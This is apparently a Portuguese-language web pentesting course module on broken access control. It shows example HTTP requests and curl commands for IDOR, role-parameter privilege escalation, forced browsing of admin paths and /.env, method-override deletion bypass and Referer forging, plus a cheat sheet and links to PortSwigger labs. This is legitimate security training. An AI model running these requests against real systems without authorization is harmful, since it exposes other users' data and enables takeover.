# 🚪 13. Access Control — Quebra de Controle de Acesso

> Se você consegue acessar algo que não deveria, o controle de acesso está quebrado. E isso é a vulnerabilidade #1 do OWASP.

<div align="center">

| ⏱️ Tempo | 📊 Nível | 🔧 Ferramentas |
|:--------:|:--------:|:--------------:|
| 50min | ⭐⭐ Intermediário | `Burp Repeater, curl` |

</div>

---

## 🎓 Por que isso importa?

Broken Access Control é a vulnerabilidade mais comum e impactante. OWASP 2025 a classifica como **A01**. Ocorre quando a aplicação não verifica corretamente se o usuário tem permissão para acessar um recurso.

**Analogia:** Imagine um prédio onde qualquer pessoa pode entrar no escritório do diretor porque a fechadura só verifica se a porta está destrancada, não quem está abrindo.

**Impacto real:**
- **IDOR** — acessar dados de outros usuários trocando IDs
- **Privilege escalation** — assumir papel admin
- **Forced browsing** — acessar páginas administrativas sem autenticação
- **Method-based access control** — contornar restrições via HTTP method

---

## 📋 Pré-requisitos

| Conhecimento | Necessário? | Onde aprender |
|:-------------|:-----------:|:-------------:|
| HTTP basics (methods, status codes) | Sim | Módulo 00 |
| Burp Suite (Repeater) | Sim | Arquivo 01 deste módulo |

---

## 🎯 Quando testar Access Control

- Para acessar **dados de outros usuários** (trocar IDs)
- Para acessar **painéis admin** sem ser admin
- Para **bypass de restrições** baseadas em método HTTP
- Para **forced browsing** de páginas protegidas

---

## 📝 Tipos de Broken Access Control

### 1. IDOR (Insecure Direct Object Reference)

```bash
# Usuário logado acessa seus próprios dados:
GET /api/users/123/orders HTTP/1.1
Authorization: Bearer TOKEN_123

# IDOR: trocar ID para acessar outro usuário:
GET /api/users/456/orders HTTP/1.1
Authorization: Bearer TOKEN_123

# Se retornar dados do usuário 456 → IDOR confirmado
```

### 2. Privilege Escalation via Request Parameter

```bash
# Login normal:
POST /login HTTP/1.1
username=admin&password=123&role=user

# Privilege escalation:
POST /login HTTP/1.1
username=admin&password=123&role=admin
```

### 3. Forced Browsing

```bash
# Páginas admin sem autenticação:
http://target.com/admin
http://target.com/admin/dashboard
http://target.com/api/admin/users
http://target.com/debug/console
http://target.com/actuator
```

### 4. Method-Based Access Control

```bash
# DELETE bloqueado para não-admin:
DELETE /api/users/123 HTTP/1.1
Authorization: Bearer USER_TOKEN
# → 403 Forbidden

# Bypass: trocar método
POST /api/users/123 HTTP/1.1
Authorization: Bearer USER_TOKEN
X-HTTP-Method-Override: DELETE
# → 200 OK
```

### 5. Referer-Based Access Control

```bash
# Se a app verifica Referer para acesso:
# Referer: https://target.com/admin → aceita
# Referer: https://attacker.com → rejeita

# Bypass: forjar Referer
GET /api/admin/users HTTP/1.1
Referer: https://target.com/admin
```

---

## 📝 Exemplos Práticos

### Exemplo 1: IDOR em API

```bash
# 1. Logar como usuário normal
TOKEN=$(curl -X POST http://target.com/api/login \
  -d 'username=user1&password=pass123' | jq -r '.token')

# 2. Acessar seus próprios dados
curl -H "Authorization: Bearer $TOKEN" http://target.com/api/users/123/profile
# Output: {"id":123,"name":"User One","email":"user1@email.com","role":"user"}

# 3. Trocar ID para acessar outro usuário
curl -H "Authorization: Bearer $TOKEN" http://target.com/api/users/456/profile
# Output: {"id":456,"name":"Admin User","email":"admin@target.com","role":"admin"}

# IDOR confirmado! Dados de outro usuário expostos.
```

### Exemplo 2: Forced Browsing

```bash
# Testar URLs admin sem autenticação
curl -v http://target.com/admin
curl -v http://target.com/admin/dashboard
curl -v http://target.com/api/admin/users
curl -v http://target.com/debug/vars
curl -v http://target.com/actuator/env
curl -v http://target.com/.env
curl -v http://target.com/backup

# Se retornar 200 OK com dados sensíveis → vulnerabilidade
```

### Exemplo 3: Privilege Escalation

```bash
# 1. Interceptar request de login
# 2. Enviar para Repeater
# 3. Adicionar/modificar campo de role:

POST /login HTTP/1.1
Host: target.com

username=user1&password=pass123&role=admin

# 4. Se retornar token de admin → escalonamento confirmado
# 5. Usar token para acessar recursos admin
```

### Exemplo 4: Method Override

```bash
# Método bloqueado:
curl -X DELETE -H "Authorization: Bearer $TOKEN" http://target.com/api/users/123
# → 403 Forbidden

# Bypass com X-HTTP-Method-Override:
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -H "X-HTTP-Method-Override: DELETE" \
  http://target.com/api/users/123
# → 200 OK

# Ou com _method (PHP/Laravel):
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -d "_method=DELETE" \
  http://target.com/api/users/123
```

---

## 🔄 Fluxo de Teste Access Control

```
┌─────────────────────────────────────────────────────────┐
│  1. MAPEAR RECURSOS                                      │
│     - Enumerar endpoints da API                          │
│     - Identificar IDs e parâmetros                      │
│     - Catalogar métodos HTTP aceitos                     │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  2. TESTAR IDOR                                          │
│     - Trocar IDs em endpoints                            │
│     - Testar com diferentes tokens                       │
│     - Verificar se retorna dados de outros usuários      │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  3. TESTAR FORCED BROWSING                               │
│     - Acessar /admin, /debug, /actuator                 │
│     - Acessar sem autenticação                           │
│     - Testar endpoints internos                          │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  4. TESTAR METHOD-BASED                                  │
│     - Trocar DELETE por POST + override                  │
│     - Testar PUT, PATCH, DELETE                          │
│     - Verificar se restrição é por método                │
└─────────────────────────────────────────────────────────┘
```

---

## ❌ Erros Comuns

| Erro | Solução |
|------|---------|
| "IDOR não funciona" | IDs podem ser UUIDs → enumerar ou usar padrão |
| "Admin retorna 403" | Testar com e sem token → pode ser autenticação |
| "Method override não funciona" | App pode não suportar → testar outros headers |
| "Não acho endpoints admin" | Fuzzar: /admin, /manage, /dashboard, /internal |

---

## 📋 Cheat Sheet Rápido

### URLs Admin para Testar

```
/admin
/admin/dashboard
/api/admin
/api/admin/users
/debug/console
/actuator
/actuator/env
/.env
/backup
/config
/server-status
```

### Method Override Headers

```
X-HTTP-Method-Override: DELETE
X-HTTP-Method: DELETE
X-Method-Override: DELETE
_method=DELETE (POST body)
```

---

## 🧪 Labs Práticos

| # | Plataforma | Lab | Tópicos | Tempo |
|---|:----------:|:----|:--------|:-----:|
| 1 | PortSwigger | [Unprotected admin functionality](https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality) | Forced browsing | 10min |
| 2 | PortSwigger | [User role controlled by request parameter](https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter) | Role manipulation | 10min |
| 3 | PortSwigger | [User ID controlled by request parameter](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter) | IDOR básico | 10min |
| 4 | PortSwigger | [Insecure direct object references](https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references) | IDOR avançado | 10min |
| 5 | PortSwigger | [URL-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented) | URL bypass | 15min |
| 6 | PortSwigger | [Method-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented) | Method override | 15min |

---

## 📚 Referências

- [PortSwigger — Access Control](https://portswigger.net/web-security/access-control)
- [OWASP — Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [HackTricks — IDOR](https://book.hacktricks.xyz/pentesting-web/idor-insecure-direct-object-reference)

---

## ✅ Validação

Após este módulo, você deve conseguir:

- [ ] Testar IDOR trocando IDs em endpoints
- [ ] Aceder a páginas admin via forced browsing
- [ ] Bypassar restrições via method override
- [ ] Identificar privilege escalation em parâmetros
- [ ] Testar referer-based access control
- [ ] Completar os labs PortSwigger de Access Control
